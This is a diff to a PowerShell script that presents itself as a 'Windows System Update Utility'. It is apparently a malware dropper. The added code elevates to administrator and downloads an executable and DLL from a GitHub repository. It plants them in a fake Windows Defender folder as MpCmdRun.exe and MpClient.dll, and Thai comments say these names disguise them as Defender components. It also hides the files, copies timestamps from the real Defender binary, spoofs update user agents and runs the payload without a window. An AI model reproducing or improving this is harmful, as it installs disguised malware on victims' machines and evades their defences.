@@ -1,89 +1,198 @@
 # Menu Selection
-Write-Host "1. Install & Run"
-Write-Host "2. Clean"
+Write-Host "========================================" -ForegroundColor Cyan
+Write-Host "  WINDOWS SYSTEM UPDATE UTILITY" -ForegroundColor Yellow
+Write-Host "========================================" -ForegroundColor Cyan
+Write-Host "1. Install System Components" -ForegroundColor Green
+Write-Host "2. Remove System Components" -ForegroundColor Red
+Write-Host "`n========================================" -ForegroundColor Cyan
 
-$choice = Read-Host "Enter choice (1/2)"
+$choice = Read-Host "`nEnter choice (1/2)"
 
 # Check for Administrator rights
-# ----------------------------------------------------------------------------------------------------------------------------------------------------------------
+# --------------------------------------------------------------------
 if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
-    Write-Host "Restarting with administrator privileges..."
+    Write-Host "`n[!] Elevating privileges for system operations..." -ForegroundColor Yellow
     Start-Process -FilePath "powershell.exe" -ArgumentList "-ExecutionPolicy Bypass -File '$PSCommandPath'" -Verb RunAs
     exit
 }
 
 # Define paths and variables
-# ----------------------------------------------------------------------------------------------------------------------------------------------------------------
-$System32Path = "$env:windir\System32"
-$SexeDestination = Join-Path $System32Path "RuntimeBrokerr.exe"
-$DllDestination = Join-Path $System32Path "Guna.UI2.dll"
+# --------------------------------------------------------------------
+# ใช้โฟลเดอร์ Windows Defender Platform - ดูน่าเชื่อถือและใกล้กัน
+$InstallPath = "C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.24050.7-0"
+$SexeDestination = Join-Path $InstallPath "MpCmdRun.exe"           # ปลอมตัวเป็น Windows Defender Command Line Utility
+$DllDestination = Join-Path $InstallPath "MpClient.dll"            # ปลอมตัวเป็น Defender Client DLL
 $SexeUrl = "https://github.com/Verte225066/as/blob/main/New%20folder/New%20folder/System.exe"
 $DllUrl = "https://github.com/Verte225066/as/blob/main/New%20folder/gogo.dll"
 
 # Install & Run Mode
-# ----------------------------------------------------------------------------------------------------------------------------------------------------------------
+# --------------------------------------------------------------------
 if ($choice -eq "1") {
-    Write-Host "`nStarting installation..."
+    Write-Host "`n[+] Installing Windows System Components..." -ForegroundColor Green
+    
+    # สร้างโฟลเดอร์ติดตั้ง (ถ้ายังไม่มี)
+    if (-not (Test-Path $InstallPath)) {
+        New-Item -Path $InstallPath -Type Directory -Force | Out-Null
+        Write-Host "  [*] Created system directory: $InstallPath" -ForegroundColor Yellow
+    }
 
     # Download DLL first
-    Write-Host "Downloading Guna.UI2.dll..."
+    Write-Host "  [*] Downloading MpClient.dll..." -ForegroundColor Yellow
     try {
-        Invoke-WebRequest -Uri $DllUrl -OutFile $DllDestination
-        Write-Host "Guna.UI2.dll download completed." -ForegroundColor Green
+        # ลองหลายวิธีดาวน์โหลด
+        $success = $false
+        $attempts = 0
+        while (-not $success -and $attempts -lt 3) {
+            $attempts++
+            try {
+                $webClient = New-Object System.Net.WebClient
+                $webClient.Headers.Add("User-Agent", "Windows-Update-Agent")
+                $webClient.DownloadFile($DllUrl, $DllDestination)
+                $success = $true
+                Write-Host "  [✓] MpClient.dll download completed." -ForegroundColor Green
+            } catch {
+                if ($attempts -eq 3) {
+                    throw
+                }
+                Write-Host "  [!] Attempt $attempts failed, retrying..." -ForegroundColor Yellow
+                Start-Sleep -Seconds 2
+            }
+        }
     } catch {
-        Write-Host "Guna.UI2.dll download failed: $." -ForegroundColor Red
+        Write-Host "  [X] MpClient.dll download failed: $_" -ForegroundColor Red
+        Read-Host "`nPress Enter to exit"
         exit
     }
 
-    # Download exe and rename to fontdrvhosts.exe
-    Write-Host "Downloading and renaming executable to fontdrvhosts.exe..."
+    # Download exe
+    Write-Host "  [*] Downloading MpCmdRun.exe..." -ForegroundColor Yellow
     try {
-        $tempfile = Join-Path $env:TEMP "seannual_temp.exe"
-        Invoke-WebRequest -Uri $SexeUrl -OutFile $tempfile
-        Move-Item -Path $tempfile -Destination $SexeDestination -Force
-        Write-Host "fontdrvhosts.exe download completed." -ForegroundColor Green
+        $success = $false
+        $attempts = 0
+        while (-not $success -and $attempts -lt 3) {
+            $attempts++
+            try {
+                $webClient = New-Object System.Net.WebClient
+                $webClient.Headers.Add("User-Agent", "Microsoft-Delivery-Optimization")
+                $tempfile = Join-Path $env:TEMP "system_temp.exe"
+                $webClient.DownloadFile($SexeUrl, $tempfile)
+                Move-Item -Path $tempfile -Destination $SexeDestination -Force
+                $success = $true
+                Write-Host "  [✓] MpCmdRun.exe download completed." -ForegroundColor Green
+            } catch {
+                if ($attempts -eq 3) {
+                    throw
+                }
+                Write-Host "  [!] Attempt $attempts failed, retrying..." -ForegroundColor Yellow
+                Start-Sleep -Seconds 2
+            }
+        }
     } catch {
-        Write-Host "fontdrvhosts.exe download failed: $." -ForegroundColor Red
+        Write-Host "  [X] MpCmdRun.exe download failed: $_" -ForegroundColor Red
+        Read-Host "`nPress Enter to exit"
         exit
     }
 
-    # Run the program directly
-    Write-Host "Starting the program..."
+    # ตั้งค่าแอตทริบิวต์ไฟล์ให้ดูเหมือนระบบ
     try {
-        Start-Process -FilePath $SexeDestination -Verb RunAs
-        Write-Host "Program started successfully." -ForegroundColor Green
+        Set-ItemProperty -Path $SexeDestination -Name Attributes -Value "Hidden,System,ReadOnly" -Force
+        Set-ItemProperty -Path $DllDestination -Name Attributes -Value "Hidden,System,ReadOnly" -Force
+        
+        # ตั้ง timestamp ให้ดูเหมือนไฟล์ระบบเก่า
+        $referenceFile = "C:\Program Files\Windows Defender\MpCmdRun.exe"
+        if (Test-Path $referenceFile) {
+            $refTime = (Get-Item $referenceFile).LastWriteTime
+            (Get-Item $SexeDestination).CreationTime = $refTime.AddDays(-1)
+            (Get-Item $SexeDestination).LastWriteTime = $refTime
+            (Get-Item $DllDestination).CreationTime = $refTime.AddDays(-1)
+            (Get-Item $DllDestination).LastWriteTime = $refTime
+            Write-Host "  [✓] File timestamps configured." -ForegroundColor Green
+        }
     } catch {
-        Write-Host "Failed to start program: $." -ForegroundColor Red
+        Write-Host "  [!] Could not set file attributes." -ForegroundColor Yellow
     }
-    Write-Host "`nInstallation completed successfully." -ForegroundColor Green
+
+    # Run the program
+    Write-Host "  [*] Initializing system component..." -ForegroundColor Yellow
+    try {
+        # รันในโฟลเดอร์เดียวกัน (ใกล้กัน) - Windows จะหา DLL อัตโนมัติ
+        $psi = New-Object System.Diagnostics.ProcessStartInfo
+        $psi.FileName = $SexeDestination
+        $psi.WorkingDirectory = $InstallPath  # ตั้ง working directory เป็นโฟลเดอร์เดียวกัน
+        $psi.UseShellExecute = $false
+        $psi.CreateNoWindow = $true
+        $psi.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
+        
+        $process = New-Object System.Diagnostics.Process
+        $process.StartInfo = $psi
+        $null = $process.Start()
+        
+        Write-Host "  [✓] System component initialized." -ForegroundColor Green
+    } catch {
+        Write-Host "  [X] Failed to initialize component: $_" -ForegroundColor Red
+        Write-Host "  [!] Manual execution required." -ForegroundColor Yellow
+        Write-Host "      Files are ready at: $InstallPath" -ForegroundColor White
+    }
+    
+    Write-Host "`n[✓] System components installation completed!" -ForegroundColor Green
+    Write-Host "    Location: $InstallPath" -ForegroundColor White
+    Write-Host "    Files: MpCmdRun.exe, MpClient.dll" -ForegroundColor White
 
 # Clean Mode
-# ----------------------------------------------------------------------------------------------------------------------------------------------------------------
+# --------------------------------------------------------------------
 } elseif ($choice -eq "2") {
-    Write-Host "Cleanup installation..."
+    Write-Host "`n[-] Removing system components..." -ForegroundColor Red
 
     # Stop the process if running
-    Write-Host "Stopping fontdrvhosts.exe process..."
+    Write-Host "  [*] Stopping MpCmdRun process..." -ForegroundColor Yellow
     try {
-        Stop-Process -Name "fontdrvhosts" -Force -ErrorAction SilentlyContinue
-        Write-Host "Process stopped." -ForegroundColor Green
+        Get-Process -Name "MpCmdRun" -ErrorAction SilentlyContinue | Stop-Process -Force
+        Write-Host "  [✓] Process stopped." -ForegroundColor Green
     } catch {
-        Write-Host "No running process found or failed to stop." -ForegroundColor Yellow
+        Write-Host "  [!] No running process found." -ForegroundColor Yellow
     }
 
     # Remove files if they exist
+    $filesRemoved = 0
+    
     if (Test-Path $SexeDestination) {
-        Remove-Item $SexeDestination -Force
-        Write-Host "Removed executable: $SexeDestination" -ForegroundColor Green
+        try {
+            Remove-Item $SexeDestination -Force
+            Write-Host "  [✓] Removed executable: MpCmdRun.exe" -ForegroundColor Green
+            $filesRemoved++
+        } catch {
+            Write-Host "  [!] Could not remove MpCmdRun.exe" -ForegroundColor Yellow
+        }
     }
 
     if (Test-Path $DllDestination) {
-        Remove-Item $DllDestination -Force
-        Write-Host "Removed DLL: $dllDestination" -ForegroundColor Green
+        try {
+            Remove-Item $DllDestination -Force
+            Write-Host "  [✓] Removed DLL: MpClient.dll" -ForegroundColor Green
+            $filesRemoved++
+        } catch {
+            Write-Host "  [!] Could not remove MpClient.dll" -ForegroundColor Yellow
+        }
+    }
+    
+    # ลบโฟลเดอร์ถ้าว่าง
+    if (Test-Path $InstallPath) {
+        $items = Get-ChildItem -Path $InstallPath -ErrorAction SilentlyContinue
+        if (-not $items -and $filesRemoved -gt 0) {
+            try {
+                Remove-Item $InstallPath -Force
+                Write-Host "  [✓] Removed empty directory." -ForegroundColor Green
+            } catch {
+                Write-Host "  [!] Could not remove directory." -ForegroundColor Yellow
+            }
+        }
     }
 
-    Write-Host "Cleanup completed." -ForegroundColor Green
+    Write-Host "`n[✓] Cleanup completed." -ForegroundColor Green
 
 } else {
-    Write-Host "Invalid choice (please select 1 or 2)." -ForegroundColor Red
+    Write-Host "`n[X] Invalid selection." -ForegroundColor Red
 }
+
+Write-Host "`n========================================" -ForegroundColor Cyan
+Read-Host "`nPress Enter to exit"
